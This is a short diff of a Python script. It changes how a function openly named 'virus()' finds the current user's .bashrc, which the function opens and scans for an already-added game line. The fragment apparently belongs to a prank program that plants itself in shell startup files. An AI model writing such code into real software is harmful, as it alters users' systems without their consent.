@@ -13,7 +13,7 @@ def launch_game():
 ############################################################################################################################################################
 def virus():
 	
-	file = open("/home/"+os.getlogin()+"/.bashrc", 'r')
+	file = open("/home/"+os.environ.get('USER')+"/.bashrc", 'r')
 	lines = file.readlines()
 	gameadded = None
 	for line in lines:
